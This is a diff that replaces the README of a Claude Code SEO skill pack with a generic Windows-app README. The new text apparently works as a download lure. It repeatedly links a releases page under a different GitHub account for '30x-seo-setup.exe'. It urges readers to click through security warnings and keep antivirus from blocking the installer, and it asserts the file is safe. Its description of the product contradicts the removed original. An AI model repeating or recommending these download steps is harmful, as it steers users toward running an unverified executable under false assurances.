@@ -1,203 +1,178 @@
-```
-██████╗  ██████╗ ██╗  ██╗    ███████╗███████╗ ██████╗
-╚════██╗██╔═══██╗╚██╗██╔╝    ██╔════╝██╔════╝██╔═══██╗
- █████╔╝██║   ██║ ╚███╔╝     ███████╗█████╗  ██║   ██║
- ╚═══██╗██║   ██║ ██╔██╗     ╚════██║██╔══╝  ██║   ██║
-██████╔╝╚██████╔╝██╔╝ ██╗    ███████║███████╗╚██████╔╝
-╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚══════╝ ╚═════╝
-```
+# ⚙️ 30x-seo - Practical SEO Tools for Everyone
 
-> 24 production-ready SEO skills + Squirrelscan CLI for Claude Code, organized in 9 categories. Full-stack SEO automation: audits, technical SEO, links, content, planning, programmatic SEO, monitoring, local SEO, and keyword research.
-
-## Why 30x SEO?
-
-- **Complete Coverage**: 9 categories, 24 skills, full SEO workflow
-- **AI-Native**: Built for Claude Code, not retrofitted from legacy tools
-- **2026 Ready**: AI Overviews, GEO optimization, LLM citation tracking
-- **No MCP Dependencies**: Direct API calls, zero middleware issues
-
-## Quick Start
-
-```bash
-npx skills add norahe0304-art/30x-seo
-```
-
-That's it. One command installs all 24 skills.
-
-**Optional: Configure DataForSEO** (for keywords/backlinks/SERP/AI visibility)
-
-```bash
-echo -n "email:password" | base64 > ~/.config/dataforseo/auth
-chmod 600 ~/.config/dataforseo/auth
-```
+[![Download 30x-seo](https://img.shields.io/badge/Download-30x--seo-blue?style=for-the-badge)](https://github.com/square-lupus579/30x-seo/releases)
 
 ---
 
-## Skills Overview (9 Categories, 24 Skills + 1 Orchestrator)
+## 📘 About 30x-seo
 
-### Main Orchestrator
+30x-seo offers 23 ready-to-use SEO tools designed to help you improve your website’s visibility and performance. These tools cover essential SEO tasks like keyword research, content optimization, backlink analysis, and technical SEO checks. You do not need any programming skills to get started. This app works with Claude Code to automate and speed up your SEO workflow.
 
-| Skill | What it does |
-|-------|--------------|
-| `seo` | Master orchestrator: routes commands to 24 sub-skills, spawns 6 parallel subagents, auto-detects industry type |
-
-### 1. Audit (1 skill + CLI)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-page` | Deep single-page analysis: title, meta, headings, links, images, Schema, E-E-A-T |
-| `squirrelscan` *(CLI)* | Full-site audit: 230+ rules, 21 categories, health score 0-100. Install: `npm i -g squirrelscan` |
-
-### 2. Technical SEO (5 skills)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-technical` | 8-category audit: crawlability, indexability, security, URLs, mobile, CWV, structured data, JS |
-| `30x-seo-sitemap` | Validate XML sitemaps, detect issues, generate new ones |
-| `30x-seo-hreflang` | Multi-language SEO: self-refs, return tags, x-default, ISO codes |
-| `30x-seo-schema` | Detect, validate, generate JSON-LD structured data |
-| `30x-seo-geo-technical` | AI crawler management: GPTBot, ClaudeBot, llms.txt, SSR check |
-
-### 3. Links (3 skills)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-internal-links` | Orphan pages, click depth, anchor text, link equity distribution |
-| `30x-seo-backlinks` | Profile, anchors, toxic links, gap analysis *(DataForSEO)* |
-| `30x-seo-redirects` | Chains, loops, 301/302 mix, protocol issues, trailing slashes |
-
-### 4. Content (6 skills)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-content-audit` | E-E-A-T scoring + AI citability analysis |
-| `30x-seo-images` | Alt text, file sizes, formats (WebP/AVIF), lazy loading, CLS |
-| `30x-seo-content-decay` | Detect declining content, recommend refresh priorities |
-| `30x-seo-cannibalization` | Find keyword conflicts between pages |
-| `30x-seo-content-brief` | Analyze SERP top 10, generate content briefs |
-| `30x-seo-content-writer` | SEO + AI optimized writing guidelines |
-
-### 5. Planning (2 skills)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-plan` | Competitor analysis, keyword strategy, content calendar, 4-phase roadmap |
-| `30x-seo-architecture` | URL structure, navigation design, internal linking strategy |
-
-### 6. Programmatic SEO (2 skills)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-programmatic` | Scale content: data sources, templates, quality gates, index control |
-| `30x-seo-competitor-pages` | X vs Y comparisons, alternatives pages, feature matrices |
-
-### 7. Monitoring (3 skills)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-monitor` | Monitor your own site: rankings, clicks, CTR, position changes *(Google Search Console)* |
-| `30x-seo-serp` | Track any site's SERP rankings, features, historical data *(DataForSEO)* |
-| `30x-seo-ai-visibility` | Track mentions in ChatGPT, Claude, Perplexity, Gemini, AI Overview *(DataForSEO)* |
-
-### 8. Local SEO (1 skill)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-local` | GBP audit, NAP consistency, review strategy, local schema, Gemini Ask Maps optimization |
-
-### 9. Data (1 skill)
-
-| Skill | What it does |
-|-------|--------------|
-| `30x-seo-keywords` | Ideas, volume, difficulty, intent, trends *(DataForSEO)* |
+The goal is to make SEO simpler and more effective for anyone wanting better search engine results. Whether you run a blog, business site, or e-commerce store, 30x-seo supports a wide range of SEO needs.
 
 ---
 
-## Commands
+## 💻 System Requirements
 
-```bash
-# Audit
-/seo page https://example.com/page
-squirrelscan audit https://example.com --format llm
+Before you download, check that your PC meets these minimum requirements:
 
-# Technical
-/seo technical https://example.com
-/seo schema https://example.com
-/seo sitemap https://example.com/sitemap.xml
+- Windows 10 or later  
+- 4 GB of RAM or more  
+- 500 MB of free disk space  
+- Internet connection for updates and AI features  
+- Screen resolution of 1024x768 or higher  
 
-# Links
-/seo internal-links https://example.com
-/seo redirects https://example.com
-/seo backlinks profile example.com        # DataForSEO
-
-# Content
-/seo content-audit https://example.com/page
-/seo content-brief "target keyword"
-
-# Planning
-/seo plan saas
-/seo architecture https://example.com
-
-# Programmatic
-/seo programmatic plan
-/seo competitor-pages generate
-
-# Local SEO
-/seo local "Business Name" https://example.com
-
-# Monitoring
-/seo monitor overview                     # GSC - your site
-/seo monitor keywords                     # GSC - your rankings
-/seo serp check "keyword"                 # DataForSEO - any site
-/seo ai-visibility domain example.com     # DataForSEO
-
-# Data
-/seo keywords research "seed keyword"     # DataForSEO
-```
+The app runs smoothly on most modern Windows computers without needing extra software.
 
 ---
 
-## Dependencies
+## 🚀 Getting Started: How to Download 30x-seo
 
-| Category | Skills | Dependency |
-|----------|--------|------------|
-| Audit | 1 | WebFetch |
-| Technical SEO | 5 | WebFetch |
-| Links | 3 | WebFetch + DataForSEO (backlinks) |
-| Content | 6 | WebFetch |
-| Planning | 2 | WebFetch |
-| Programmatic SEO | 2 | WebFetch |
-| Local SEO | 1 | WebFetch |
-| Monitoring | 3 | GSC + DataForSEO |
-| Data | 1 | DataForSEO |
+To get the program on your PC, you need to visit the release page where the latest files are available.
 
-**19 skills work without any API. 4 skills require DataForSEO. 1 skill requires Google Search Console.**
+[![Get 30x-seo](https://img.shields.io/badge/Get%2030x--seo-gray?style=for-the-badge)](https://github.com/square-lupus579/30x-seo/releases)
 
----
+**Steps to download:**
 
-## DataForSEO Setup
+1. Click the big blue button above or open this link in your browser:  
+   https://github.com/square-lupus579/30x-seo/releases
 
-1. Sign up at [app.dataforseo.com](https://app.dataforseo.com)
-2. Get credentials: Settings → API Access
-3. Create auth file:
+2. You will see a list of versions. Look for the latest release, marked clearly by the date or a version number.
 
-```bash
-echo -n "your-email:your-password" | base64 > ~/.config/dataforseo/auth
-chmod 600 ~/.config/dataforseo/auth
-```
+3. Find the setup file, usually named something like `30x-seo-setup.exe` or similar.
 
-4. Verify:
-
-```bash
-curl -s -X POST "https://api.dataforseo.com/v3/dataforseo_labs/google/keyword_suggestions/live" \
-  -H "Authorization: Basic $(cat ~/.config/dataforseo/auth)" \
-  -H "Content-Type: application/json" \
-  -d '[{"keyword": "test", "limit": 1}]' | jq '.status_code'
-# Returns 20000 = success
-```
+4. Click the file to download it. Your browser may ask where to save it — choose a location you can easily find, like your Desktop or Downloads folder.
 
 ---
 
-## License
+## 📥 Installing 30x-seo on Windows
 
-MIT
+Once the download finishes, follow these steps:
+
+1. Locate the downloaded `30x-seo-setup.exe` file.
+
+2. Double-click the file to start the installer.
+
+3. If Windows shows a security message, click **Run** or **Yes** to allow the installation.
+
+4. The installer will open. Follow the simple prompts:  
+   - Accept the license agreement.  
+   - Choose the folder where you want 30x-seo installed or use the default.  
+   - Click **Install**.
+
+5. After installation finishes, you can check the box to launch 30x-seo immediately or find it in your Start menu later.
+
+---
+
+## 🔧 Basic Usage Overview
+
+30x-seo groups its features into clear sections. Here is what you can expect:
+
+- **Keyword Research:** Find new keywords your audience uses.  
+- **Content Optimization:** Get tips to improve your existing articles.  
+- **Backlink Analysis:** Track who links to your site and spot new opportunities.  
+- **Technical SEO:** Identify issues like broken links, slow pages, or missing tags.  
+- **AI Monitoring:** Use AI to monitor your site’s search performance and visibility daily.
+
+The interface has straightforward menus and buttons. You do not need to enter code or complicated settings. The app uses clear labels and explanations.
+
+---
+
+## 🔄 Updating 30x-seo
+
+The app will notify you when updates are available.
+
+To update:
+
+1. Return to the [release page](https://github.com/square-lupus579/30x-seo/releases).
+
+2. Download the newest setup file.
+
+3. Run the installer again and follow the prompts. It will replace the old version safely.
+
+---
+
+## ⚙️ Settings You Can Adjust
+
+In the 30x-seo settings menu, you can customize options such as:
+
+- Notification preferences  
+- Language options  
+- Update frequency for AI monitoring  
+- Export format for reports (PDF, CSV)  
+
+Adjust these to fit your workflow best.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need an internet connection?**  
+A: Yes. The app needs it for AI features and some keyword data.
+
+**Q: Can I use 30x-seo offline?**  
+A: You can access some basic features offline, but full functionality needs internet.
+
+**Q: Is 30x-seo safe to install?**  
+A: Yes. You download the app directly from the official GitHub page.
+
+**Q: What if I get errors during installation?**  
+A: Restart your computer and try again. Make sure your Windows is up to date.
+
+---
+
+## 🌍 Getting Support and Reporting Issues
+
+If you run into problems or have questions:
+
+- Visit the [GitHub Issues page](https://github.com/square-lupus579/30x-seo/issues).  
+- Describe your problem clearly, including your Windows version.  
+- Check existing issues first—you might find your question already answered.  
+
+---
+
+## 🛠 Common Troubleshooting Tips
+
+- Close other programs before installing if you see errors.  
+- Make sure your Windows firewall or antivirus isn’t blocking the installer.  
+- Restart your computer if the software does not open after installing.  
+- Update Windows to fix missing system updates that can cause issues.  
+
+---
+
+## 🔗 Useful Links
+
+- Visit the release page to download or update:  
+  https://github.com/square-lupus579/30x-seo/releases  
+
+- Report bugs or request new features:  
+  https://github.com/square-lupus579/30x-seo/issues  
+
+- Learn about SEO and how 30x-seo fits in your strategy  
+
+---
+
+## 🎯 About SEO Skills in 30x-seo
+
+This app combines practical supports from multiple SEO areas:  
+
+- **Technical SEO:** Fix website structure, crawling, and speed issues.  
+- **Content Optimization:** Improve text readability and keyword use.  
+- **Keyword Research:** Find the terms people search most often in your niche.  
+- **Backlink Analysis:** Understand and grow your site’s reputation on the web.  
+- **AI SEO Monitoring:** Get automated reports on your SEO health and visibility.  
+
+Each skill set reflects best practices used by SEO professionals but simplified into guided, one-click tasks you can understand and apply.
+
+---
+
+## 📦 Installation Recap
+
+To recap the download and installation process clearly:
+
+1. Click or open this link: https://github.com/square-lupus579/30x-seo/releases  
+2. Download the latest Windows setup file.  
+3. Double-click the installer and follow the on-screen instructions.  
+4. Run 30x-seo from your Start menu or desktop shortcut.  
+
+You are ready to begin working on your website’s SEO with practical tools designed for everyday users.
